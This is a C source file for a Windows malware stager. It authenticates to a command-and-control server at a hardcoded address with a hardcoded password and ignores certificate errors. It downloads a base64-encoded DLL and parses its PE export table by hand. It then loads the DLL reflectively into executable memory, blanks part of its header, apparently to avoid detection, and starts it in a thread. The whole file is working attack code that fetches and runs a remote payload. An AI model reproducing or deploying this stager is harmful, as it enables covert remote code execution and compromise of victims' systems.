#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <tlhelp32.h>

#define c2Auth "P@$$W0RD"

DWORD findExportDirectoryInfo(unsigned char* rdll, DWORD pointerToRawData, DWORD virtualAddressOffset) {
    DWORD exportAddressTableRVAOffset = pointerToRawData + 0x4 + 0x4 + 0x2 + 0x2 + 0x4 + 0x4 + 0x4 + 0x4;
    DWORD namePointerRVAOffset = exportAddressTableRVAOffset + 0x4;
    DWORD exportNamePointerRVA = (rdll[namePointerRVAOffset+3] << 24) | (rdll[namePointerRVAOffset+2] << 16) | (rdll[namePointerRVAOffset+1] << 8) | rdll[namePointerRVAOffset];
    DWORD edataVirtualAddress = (rdll[virtualAddressOffset+3] << 24) | (rdll[virtualAddressOffset+2] << 16) | (rdll[virtualAddressOffset+1] << 8) | rdll[virtualAddressOffset];
    DWORD exportNamePointerFileOffset = ( exportNamePointerRVA - edataVirtualAddress ) + pointerToRawData;
    DWORD symbolNameRVA = (rdll[exportNamePointerFileOffset+3] << 24) | (rdll[exportNamePointerFileOffset+2] << 16) | (rdll[exportNamePointerFileOffset+1] << 8) | rdll[exportNamePointerFileOffset];
    DWORD symbolFileOffset = ( symbolNameRVA - edataVirtualAddress ) + pointerToRawData;
    unsigned char symbolName[MAX_PATH] = { 0 };
    for (int i = 0; i < MAX_PATH; i++) {
        if (rdll[symbolFileOffset+i] == 0) {
            break;
        }
        symbolName[i] = rdll[symbolFileOffset+i];
    }
    DWORD exportAddressTableRVA = (rdll[exportAddressTableRVAOffset+3] << 24) | (rdll[exportAddressTableRVAOffset+2] << 16) | (rdll[exportAddressTableRVAOffset+1] << 8) | rdll[exportAddressTableRVAOffset];
    DWORD symbolRVAOffset = ( exportAddressTableRVA - edataVirtualAddress ) + pointerToRawData;
    DWORD symbolRVA = (rdll[symbolRVAOffset+3] << 24) | (rdll[symbolRVAOffset+2] << 16) | (rdll[symbolRVAOffset+1] << 8) | rdll[symbolRVAOffset];
    return symbolRVA;
}

void findSectionHeaders(unsigned char* rdll, int rdll_len, DWORD firstSectionHeaderOffset, DWORD noOfSections) {
    DWORD nextSectionHeaderOffset = firstSectionHeaderOffset;
    for (int i = 0; i < noOfSections; i++) {
        CHAR headerName[] = { rdll[nextSectionHeaderOffset], rdll[nextSectionHeaderOffset+1], rdll[nextSectionHeaderOffset+2], 
        rdll[nextSectionHeaderOffset+3], rdll[nextSectionHeaderOffset+4], rdll[nextSectionHeaderOffset+5], 
        rdll[nextSectionHeaderOffset+6], rdll[firstSectionHeaderOffset+7], 0x00 };
        DWORD virtualSizeOffset = nextSectionHeaderOffset + 0x8;
        DWORD virtualAddressOffset = virtualSizeOffset + 0x4;
        DWORD sizeOfRawDataOffset = virtualAddressOffset + 0x4;
        DWORD pointerToRawDataOffset = sizeOfRawDataOffset + 0x4;
        DWORD pointerToRelocationsOffset = pointerToRawDataOffset + 0x4;
        DWORD pointerToLinenumbersOffset = pointerToRelocationsOffset + 0x4;
        DWORD numberOfLinenumbersOffset = pointerToLinenumbersOffset + 0x4;
        DWORD characteristicsOffset = numberOfLinenumbersOffset + 0x4;

        if (strstr(headerName, ".edata")) {
            DWORD firstByte = rdll[pointerToRawDataOffset+3];
            DWORD secondByte = rdll[pointerToRawDataOffset+2];
            DWORD thirdByte = rdll[pointerToRawDataOffset+1];
            DWORD fourthByte = rdll[pointerToRawDataOffset+0];

            DWORD pointerToRawData = ( firstByte << 24 ) | ( secondByte << 16 ) | ( thirdByte << 8 ) | fourthByte;
            DWORD symbolRVA = findExportDirectoryInfo(rdll, pointerToRawData, virtualAddressOffset);

            DWORD tempSectionHeaderOffset = firstSectionHeaderOffset;
            for (int i = 0; i < 11; i++) {
                // VirtualAddress offset is 12 bytes from firstSectionHeaderOffset ( Name = 8 bytes, VirtualSize = 4 bytes )
                DWORD sectionVirtualAddressOffset = firstSectionHeaderOffset + 0xC;
                DWORD sectionVirtualAddress = (rdll[sectionVirtualAddressOffset+3] << 24) | (rdll[sectionVirtualAddressOffset+2] << 16) | (rdll[sectionVirtualAddressOffset+1] << 8) | rdll[sectionVirtualAddressOffset];
                // SizeOfRawData offset is 4 bytes from VirtualAddress ( VirtualAddress = 4 )
                DWORD sectionSizeOfRawDataOffset = sectionVirtualAddressOffset + 0x4;
                DWORD sectionSizeOfRawData = (rdll[sectionSizeOfRawDataOffset+3] << 24) | (rdll[sectionSizeOfRawDataOffset+2] << 16) | (rdll[sectionSizeOfRawDataOffset+1] << 8) | rdll[sectionSizeOfRawDataOffset];
                // SizeOfRawData offset is 4 bytes from SizeOfRawData ( SizeOfRawData = 4 )
                DWORD sectionPointerToRawDataOffset = sectionSizeOfRawDataOffset + 0x4;
                DWORD sectionPointerToRawData = (rdll[sectionPointerToRawDataOffset+3] << 24) | (rdll[sectionPointerToRawDataOffset+2] << 16) | (rdll[sectionPointerToRawDataOffset+1] << 8) | rdll[sectionPointerToRawDataOffset];

                if  (symbolRVA > sectionVirtualAddress && (symbolRVA < sectionVirtualAddress + sectionSizeOfRawData) ) {
                    DWORD symbolFileOffset = ( symbolRVA - sectionVirtualAddress ) + sectionPointerToRawData;
                    unsigned char* boxreflectDllExectuableBuffer = (unsigned char*) VirtualAlloc(NULL, rdll_len, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);

                    memcpy(boxreflectDllExectuableBuffer, rdll, rdll_len);
                    for (int i = 0; i< 0x80; i++) {
                        if (i == 0x3c) {
                            i+=4;
                        }
                        boxreflectDllExectuableBuffer[i] = 0;
                    }

                    DWORD flOldProtect;
                    VirtualProtect(boxreflectDllExectuableBuffer, rdll_len, PAGE_EXECUTE_READ, &flOldProtect);

                    LPTHREAD_START_ROUTINE symbolExecutableAddress = (LPTHREAD_START_ROUTINE)( (ULONG_PTR)boxreflectDllExectuableBuffer + symbolFileOffset );
                    DWORD lpThreadId;
                    HANDLE hThread = CreateRemoteThread( GetCurrentProcess(), NULL, 1024*1024, symbolExecutableAddress, NULL, 0, &lpThreadId);
                    WaitForSingleObject(hThread, INFINITE);
                    break;
                }
                tempSectionHeaderOffset += 0x28;
            }
        }

        nextSectionHeaderOffset += 0x28;
    }
}

// decode base64
INT decodeBase64(CHAR* encodedText, CHAR** clearText) {
    DWORD clearTextLength;
    CryptStringToBinaryA(encodedText, 0, CRYPT_STRING_BASE64, NULL, &clearTextLength, NULL, NULL);
    *clearText = (CHAR*)calloc(clearTextLength+1, sizeof(CHAR));
    if (*clearText) {
        if (CryptStringToBinaryA(encodedText, 0, CRYPT_STRING_BASE64, (PBYTE)(*clearText), &clearTextLength, NULL, NULL)) {
            return clearTextLength;
        } else {
            free(*clearText);
            *clearText = NULL;
            return 0;
        }
    } else {
        return ERROR_INSUFFICIENT_BUFFER;
    }
}

BOOL stager(CHAR *rdll_encoded) {
    unsigned char *rdll_decoded = NULL;
    INT rdll_len = decodeBase64(rdll_encoded, (CHAR**) &rdll_decoded);

    if (rdll_len > 0) {
        DWORD peHeaderOffset = (rdll_decoded[0x3c+2] << 16) | (rdll_decoded[0x3c+1] << 8) | rdll_decoded[0x3c];
        DWORD noOfSectionsOffset = peHeaderOffset + 4 + 0x2;
        DWORD noOfSections = ( rdll_decoded[noOfSectionsOffset+1] << 8 ) | ( rdll_decoded[noOfSectionsOffset] );
        DWORD sizeOfOptionalHeaderOffset = noOfSectionsOffset + 0x2 + 0x4 + 0x4 + 0x4;
        DWORD sizeOfOptionalHeader = ( rdll_decoded[sizeOfOptionalHeaderOffset+1]<<8) | (rdll_decoded[sizeOfOptionalHeaderOffset]);
        DWORD firstSectionHeaderOffset = sizeOfOptionalHeaderOffset + 0x2 + 0x2 + sizeOfOptionalHeader;
        findSectionHeaders(rdll_decoded, rdll_len, firstSectionHeaderOffset, noOfSections);
    }
    free(rdll_decoded);
    return FALSE;
}

int main() {
    CHAR *rdll_buffer = NULL;
    HINTERNET b_Internet = NULL, b_HttpSession = NULL, b_HttpRequest = NULL;
    DWORD SecFlag = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID, HttpFlag = 0;

    // length of initial request = length of c2Auth(8) + crlf(4) + null byte
    DWORD postBufferLength = 13;
    CHAR postBuffer[13] = { 0 };
    CHAR contentLength[MAX_PATH];
    
    sprintf_s(contentLength, MAX_PATH, "Content-Length: %lu\r\n", postBufferLength);
    sprintf_s(postBuffer, 13, "%s\r\n\r\n", c2Auth);

    b_Internet = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0", INTERNET_OPEN_TYPE_PRECONFIG, 0, 0, 0);
    if (! b_Internet) {
        printf("Error: %lu\n", GetLastError());        //debug init
        goto cleanUp;
    }

    b_HttpSession = InternetConnectA(b_Internet, "192.168.0.142", 8080, 0, 0, INTERNET_SERVICE_HTTP, 0, 0);
    if (! b_HttpSession) {
        printf("Error: %lu\n", GetLastError());        //debug init
        goto cleanUp;
    }

    HttpFlag = INTERNET_FLAG_NO_COOKIES;
    b_HttpRequest = HttpOpenRequestA(b_HttpSession, "POST", "/index.html", 0, 0, 0, HttpFlag, 0);
    if (! b_HttpRequest) {
        printf("Error: %lu\n", GetLastError());        //debug init
        goto cleanUp;
    }

    if (InternetSetOptionA(b_HttpRequest, INTERNET_OPTION_SECURITY_FLAGS, &SecFlag, sizeof(SecFlag))) {
        if (HttpAddRequestHeadersA(b_HttpRequest, contentLength, -1, HTTP_ADDREQ_FLAG_ADD)) {
            if (HttpSendRequestA(b_HttpRequest, 0, 0, postBuffer, postBufferLength)) {
                CHAR tempbuff[8192+1];
                DWORD fullBufferLength = 0, copiedoffset = 0;
                while (TRUE) {
                    DWORD availableSize = 0, buff_downloaded;
                    BOOL checkVal = InternetQueryDataAvailable(b_HttpRequest, &availableSize, 0, 0);
                    if (!checkVal || availableSize == 0)  {
                        break;
                    }
                    checkVal = InternetReadFile(b_HttpRequest, tempbuff, availableSize, &buff_downloaded);
                    if (!checkVal || buff_downloaded == 0) {
                        break;
                    }
                    fullBufferLength += buff_downloaded;
                    rdll_buffer = (CHAR*)realloc(rdll_buffer, fullBufferLength+1);
                    memcpy_s(rdll_buffer+copiedoffset, fullBufferLength, tempbuff, buff_downloaded);
                    memset(tempbuff, 0, 8192+1);
                    copiedoffset += buff_downloaded;
                }
            }
        }
    }
    if (rdll_buffer) {
        stager(rdll_buffer);
    }

    cleanUp:
        if (b_HttpRequest) {
            InternetCloseHandle(b_HttpRequest);
        }
        if (b_HttpSession) {
            InternetCloseHandle(b_HttpSession);
        }
        if (b_Internet) {
            InternetCloseHandle(b_Internet);
        }
        free(rdll_buffer);
    return 0;
}